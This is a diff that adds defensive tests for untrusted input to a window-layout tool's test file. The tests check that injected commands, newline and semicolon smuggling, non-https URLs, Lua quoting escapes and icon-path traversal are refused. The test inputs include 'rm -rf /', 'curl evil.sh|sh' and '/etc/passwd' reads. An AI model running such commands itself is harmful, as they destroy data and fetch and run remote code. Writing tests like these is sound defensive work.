@@ -314,5 +314,68 @@ with Fake([term, mystery], []) as f:
         {p["id"]: p["restorable"] for p in st["placeholders"]},
         {"foot": True, "zzmystery": False})
 
+
+# --- untrusted input ------------------------------------------------------
+# Window class, window title and .desktop contents all come from other
+# applications. None of them may become a command or a path of our choosing.
+
+print("\nuntrusted input")
+
+check("a window class is never run as a command",
+      layout.command_for_client({"class": "rm -rf ~", "title": "x"}, [])[1], "")
+check("a plausible-looking class is still not a command",
+      layout.command_for_client({"class": "curl evil.sh|sh", "title": "x"}, [])[1], "")
+
+# `$`-anchored patterns can match before a trailing newline, so check both
+# that an embedded newline is refused and that a trailing one is normalised
+# away rather than surviving into the command that runs.
+for probe in ("omarchy-launch-tui btop\nrm -rf /",
+              "omarchy-launch-webapp https://ok.test\nrm -rf /",
+              "gtk-launch ok.desktop\nrm -rf /"):
+  check(f"an embedded newline is refused: {probe.split(chr(10))[0][:28]!r}",
+        layout.is_safe_command(probe), False)
+
+check("a trailing newline is normalised, not smuggled",
+      ("omarchy-launch-tui btop\n".strip(), layout.is_safe_command("omarchy-launch-tui btop\n")),
+      ("omarchy-launch-tui btop", True))
+
+check("a command outside the allowlist is refused",
+      layout.is_safe_command("sh -c 'curl evil.test | sh'"), False)
+check("a launcher with an argument smuggled in is refused",
+      layout.is_safe_command("omarchy-launch-tui btop; rm -rf /"), False)
+check("a non-https webapp url is refused",
+      layout.is_safe_command("omarchy-launch-webapp file:///etc/passwd"), False)
+
+# lua strings are built by hand, so quoting has to hold
+check("a quote cannot close the lua string",
+      layout.lua_str("a'b"), "'a\\'b'")
+check("a backslash cannot escape the closing quote",
+      layout.lua_str("a\\"), "'a\\\\'")
+
+# icon paths reach an Image in the overlay
+check("an absolute icon path outside the icon trees is refused",
+      layout.resolve_icon("/etc/passwd"), "")
+check("an icon path cannot climb out of the icon trees",
+      layout.resolve_icon("../../../../etc/hostname"), "")
+check("a real icon still resolves",
+      layout.resolve_icon("foot").startswith("/"), True)
+
+# a name is a claim; a binary this account can replace is not a safe target
+import os, shutil, tempfile
+tmpdir = tempfile.mkdtemp()
+planted = os.path.join(tmpdir, "evil")
+open(planted, "w").close()
+os.chmod(planted, 0o755)
+real_which = shutil.which
+try:
+  shutil.which = lambda n: planted if n == "evil" else real_which(n)
+  check("a class pointing at a binary we could plant is refused",
+        layout.command_for_client({"class": "org.omarchy.evil", "title": "x"}, [])[1], "")
+  check("plantable() sees a writable target", layout.plantable(planted), True)
+finally:
+  shutil.which = real_which
+check("plantable() clears a system binary",
+      layout.plantable("/usr/bin/env"), False)
+
 print(f"\n{sum(results)}/{len(results)} passed")
 sys.exit(0 if all(results) else 1)
